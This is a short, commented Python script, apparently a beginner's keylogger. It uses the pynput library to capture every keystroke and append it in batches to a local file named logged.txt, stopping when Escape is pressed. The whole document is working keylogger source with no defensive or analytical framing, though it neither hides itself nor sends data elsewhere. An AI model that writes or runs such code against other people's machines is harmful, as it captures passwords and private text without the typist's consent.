#importing pynput, a library that allows you to monitor input devices (mouse and keyboard).
import pynput

from pynput.keyboard import Key, Listener

#Define two variables here that are used later throughout the script. Count is used to check the amount of characters typed. Keys is used to reset part of the logged.txt
count= 0
keys = []

#The method that gets executed upon pressing a key, it registers the key here.
def upon_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 50:
        count = 0
        save_log(keys)
        keys =[]

#The method that gets executed upon releasing a key. If the key is anything but "escape", the program continues.
def upon_release(key):
    if key == Key.esc:
        return False


#Method used to save the registered
def save_log(keys):
    with open("logged.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

#A basic listener to make sure everything actually gets picked up.
with Listener(on_press=upon_press, on_release=upon_release) as listener:
    listener.join()